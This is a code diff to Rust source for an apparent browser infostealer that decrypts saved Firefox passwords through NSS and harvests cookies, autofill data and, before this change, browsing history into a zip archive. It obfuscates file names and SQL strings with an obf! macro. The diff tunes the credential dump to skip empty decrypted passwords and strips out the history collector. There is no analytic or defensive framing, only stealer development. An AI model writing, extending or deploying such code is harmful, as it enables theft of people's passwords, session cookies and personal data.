@@ -242,8 +242,8 @@ fn collect_passwords(zip: &mut ZipBuilder, info: &mut Info, dir: &str, profile: 
             .unwrap_or("");
         let username = unsafe { nss_decrypt(&nss, enc_user) }.unwrap_or_default();
         let password = unsafe { nss_decrypt(&nss, enc_pass) }.unwrap_or_default();
-        if host.is_empty() && username.is_empty() && password.is_empty() {
-            continue;
+        if password.is_empty() {
+            continue; // failed/garbage decrypt — never ship empty rows
         }
         out.push(serde_json::json!({
             "Hostname": host,
@@ -313,38 +313,6 @@ fn collect_cookies(zip: &mut ZipBuilder, info: &mut Info, dir: &str, profile: &P
         &json_bom(&serde_json::Value::Array(json_rows)),
     );
     zip.add_file(&format!("{dir}/Cookies.txt"), txt.as_bytes());
-    true
-}
-
-fn collect_history(zip: &mut ZipBuilder, info: &mut Info, dir: &str, profile: &Path) -> bool {
-    let Some(db) = crate::sqlutil::open(&profile.join(crate::obf!("places.sqlite"))) else {
-        return false;
-    };
-    let rows = query_db(
-        &db,
-        crate::obf!("SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE visit_count > 0").as_str(),
-    );
-    if rows.is_empty() {
-        return false;
-    }
-    let mut out = Vec::with_capacity(rows.len());
-    for r in &rows {
-        if r.len() < 4 {
-            continue;
-        }
-        out.push(serde_json::json!({
-            "Url": val_str(&r[0]),
-            "Title": val_str(&r[1]),
-            "VisitCount": val_i64(&r[2]),
-            // moz_places.last_visit_date is µs since unix epoch.
-            "Timestamp": val_i64(&r[3]) / 1_000_000,
-        }));
-    }
-    if out.is_empty() {
-        return false;
-    }
-    info.history_count += out.len();
-    zip.add_file(&format!("{dir}/History.json"), &json_bom(&serde_json::Value::Array(out)));
     true
 }
 
@@ -420,7 +388,6 @@ pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
             let mut got = false;
             got |= collect_passwords(zip, info, &dir, &profile, install.as_deref());
             got |= collect_cookies(zip, info, &dir, &profile);
-            got |= collect_history(zip, info, &dir, &profile);
             got |= collect_autofill(zip, info, &dir, &profile);
             found_any |= got;
         }
